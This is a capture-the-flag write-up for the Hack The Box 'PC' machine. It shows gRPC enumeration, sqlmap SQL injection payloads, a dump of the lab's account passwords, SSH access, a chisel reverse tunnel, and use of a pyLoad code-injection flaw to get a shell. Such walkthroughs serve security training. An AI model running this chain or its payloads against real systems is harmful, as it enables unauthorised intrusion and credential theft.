# PC

This is the write-up for PC machine from Hack The Box.

# Reconnaissance

First, we execute a full port scan on the host.

```bash
╭─[us-free-1]-[]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.129.226.115

PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
```

Now, we execute a port scan only on the open ports on the host.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ sudo nmap -vv -A -Pn -p 22,50051 -oA nmap/pc 10.129.226.115

PORT      STATE SERVICE REASON         VERSION                                                                                                      [51/126]
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                                                         
| ssh-hostkey:                                                                                                                                              
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)                                                                                                             
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChKXbRHNGTarynUVI8hN9pa0L2IvoasvTgCN80atXySpKMerjyMlVhG9QrJr62jtGg4J39fqxW06LmUCWBa0IxGF0thl2JCw3zyCqq0y8+hHZk0S3Wk9
IdNcvd2Idt7SBv7v7x+u/zuDEryDy8aiL1AoqU86YYyiZBl4d2J9HfrlhSBpwxInPjXTXcQHhLBU2a2NA4pDrE9TxVQNh75sq3+G9BdPDcwSx9Iz60oWlxiyLcoLxz7xNyBb3PiGT2lMDehJiWbKNEOb+JYp
4jIs90QcDsZTXUh3thK4BDjYT+XMmUOvinEeDFmDpeLOH2M42Zob0LtqtpDhZC+dKQkYSLeVAov2dclhIpiG12IzUCgcf+8h8rgJLDdWjkw+flh3yYnQKiDYvVC+gwXZdFMay7Ht9ciTBVtDnXpWHVVBpv4C
7efdGGDShWIVZCIsLboVC+zx1/RfiAI5/O7qJkJVOQgHH/2Y2xqD/PX4T6XOQz1wtBw1893ofX3DhVokvy+nM=                                                                      
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)                                                                                                            
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPqhx1OUw1d98irA5Ii8PbhDG3KVbt59Om5InU2cjGNLHATQoSJZtm9DvtKZ+NRXNuQY/rARHH3BnnkiCS
yWWJc=                                                                                                                                                      
|   256 1aa89572515e8e3cf180f542fd0a281c (ED25519)                                                                                                          
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBG1KtV14ibJtSel8BP4JJntNT3hYMtFkmOgOVtyzX/R                                                                          
50051/tcp open  unknown syn-ack ttl 63
```

# Enumeration

We have two ports open, one of them is an SSH service, another, nmap doesn’t catch the name and version of the service. Using netcat, we connected on the service and got.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ nc -vn 10.129.226.115 50051
(UNKNOWN) [10.129.226.115] 50051 (?) open
???
```

Accessing this IP and port on our browser, we got.

![Untitled](images/Untitled.png)

Searching on Google we found that te service is running on this port could be a gRPC server. Searching for how we can interact with this service, we could get a name of a tool called grpcurl.

[https://github.com/fullstorydev/grpcurl](https://github.com/fullstorydev/grpcurl)

Executing grpcurl in order to list services, we got.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ grpcurl -plaintext 10.129.226.115:50051 list              
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

Listing the SimpleApp service, we got.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ grpcurl -plaintext 10.129.226.115:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

We have three methods running on this application. Executing the describe option from grpcurl, we got.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ grpcurl -plaintext 10.129.226.115:50051 describe      
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

Trying to call some of this, we were able to interact, like that.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─[☢] $ grpcurl -plaintext 10.129.226.115:50051 SimpleApp.LoginUser 
{
  "message": "Login unsuccessful"
}
```

We could find a WebUI application that could interact with the gRPC service.

[https://github.com/fullstorydev/grpcui](https://github.com/fullstorydev/grpcui)

We execute this tool as follows.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ grpcui -plaintext 10.129.226.115:50051 &                   
[1] 729645
```

And it opens a webpage for us.

 

![Untitled](images/Untitled%201.png)

After trying some tests of common vulnerabilities, we decide to check if there any SQL Injection on those requests.

# Exploitation

First, we create a user on the application.

![Untitled](images/Untitled%202.png)

![Untitled](images/Untitled%203.png)

Then we log into the application.

![Untitled](images/Untitled%204.png)

![Untitled](images/Untitled%205.png)

Then we catch the token and id and use them on getInfo request and capture it on Burp Suite.

![Untitled](images/Untitled%206.png)

![Untitled](images/Untitled%207.png)

We copy this request to a file and execute sqlmap on it.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ sqlmap -r getinfo.req --random-agent
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:08:11 /2023-05-21/

[16:08:11] [INFO] parsing HTTP request from 'getinfo.req'
[16:08:11] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/3.0.13' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q]
Cookie parameter 'remember_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]
[16:08:13] [INFO] resuming back-end DBMS 'sqlite'
[16:08:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGUiLCJleHAiOjE2ODQ2NDU4MjV9.etMlQ2zrkXGC8b-MP7XQvkxvJH73TSJnKveADyNHSEQ"}],"data":[{"id":"774 AND 3575=3575"}]}

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGUiLCJleHAiOjE2ODQ2NDU4MjV9.etMlQ2zrkXGC8b-MP7XQvkxvJH73TSJnKveADyNHSEQ"}],"data":[{"id":"774 AND 8278=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGUiLCJleHAiOjE2ODQ2NDU4MjV9.etMlQ2zrkXGC8b-MP7XQvkxvJH73TSJnKveADyNHSEQ"}],"data":[{"id":"-1025 UNION ALL SELECT CHAR(113,112,120,107,113)||CHAR(104,106,74,78,78,118,100,122,81,83,85,79,85,90,66,80,75,108,79,87,90,114,103,72,118,85,66,80,71,67,118,97,116,119,80,73,86,66,81,99)||CHAR(113,120,122,98,113)-- JBhs"}]}
---
[16:08:14] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[16:08:14] [INFO] fetched data logged to text files under '/home/th3g3ntl3m4n/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 16:08:14 /2023-05-21/
```

We have our SQL Injection. Now we dumped all the information from the database(s).

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]                                                                                           
╰─ $ sqlmap -r getinfo.req --random-agent --dump-all                                                                                                        
        ___                                                                                                                                                 
       __H__                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.7.2#stable}                                                                                                                    
|_ -| . [(]     | .'| . |                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                
                                                                                                                                                            
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applica
ble local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                   
                                                                                                                                                            
[*] starting @ 16:10:39 /2023-05-21/

...

Database: <current>
Table: accounts
[3 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
| th3g3ntl3m4n           | test@123 |
+------------------------+----------+

[16:10:42] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/home/th3g3ntl3m4n/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'
[16:10:42] [INFO] fetching columns for table 'messages' 
[16:10:42] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[2 entries]
+-----+----------------------------------------------+-------------+
| id  | message                                      | username    |
+-----+----------------------------------------------+-------------+
| 1   | The admin is working hard to fix the issues. | admin       |
| 774 | Will update soon.                            |th3g3ntl3m4n |
+-----+----------------------------------------------+-------------+
```

## Credentials Found

| **USER** | **PASSWORD** | **SERVICE** |
| --- | --- | --- |
| HereIsYourPassWord1431 | sau | SSH |

We log in with these credentials on the SSH service as sau user.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/pc]
╰─ $ ssh sau@10.129.226.115                                        
The authenticity of host '10.129.226.115 (10.129.226.115)' can't be established.
ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:26: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.226.115' (ED25519) to the list of known hosts.
sau@10.129.226.115's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
```

# Privilege Escalation

After some common tests to find a path to privilege escalation, we verify that is running a service on port 9666 locally.

```bash
sau@pc:~$ netstat -nlpt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Using chisel we forward this port to our local machine.

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

On our attack machine, we run.

```bash
╭─[us-free-1]-[10.10.14.43]-[th3g3ntl3m4n@kali]-[~/htb/season/images/www]
╰─ $ ./chisel server -p 8000 --reverse &
[2] 747078
2023/05/21 16:25:28 server: Reverse tunnelling enabled                                                                                                      
2023/05/21 16:25:28 server: Fingerprint UGUhcjbi10zk+270aZuLvFhtUxSEK3RWuMmdwPiBW/M=
2023/05/21 16:25:28 server: Listening on http://0.0.0.0:8000
```

On the target machine, we run.

```bash
sau@pc:/dev/shm$ ./chisel client 10.10.14.43:8000 R:9666:127.0.0.1:9666 &
[1] 2279
```

Accessing this service on our browser, we got.

![Untitled](images/Untitled%208.png)

Searching for some public exploits for the pyLoad application, we found this new CVE.

[Code Injection in pyload](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)

According to this blog, there is a Remote Code Execution (RCE) on parameter jk from the request for endpoint /flash/addcrypt2. By checking this endpoint, we could see it’s available.

![Untitled](images/Untitled%209.png)

We encoded our payload entirely on URL encode using Burp Suite Decoder.

![Untitled](images/Untitled%2010.png)

We execute the following request on Burp Suite.

![Untitled](images/Untitled%2011.png)

And check our pwncat listener.

![Untitled](images/Untitled%2012.png)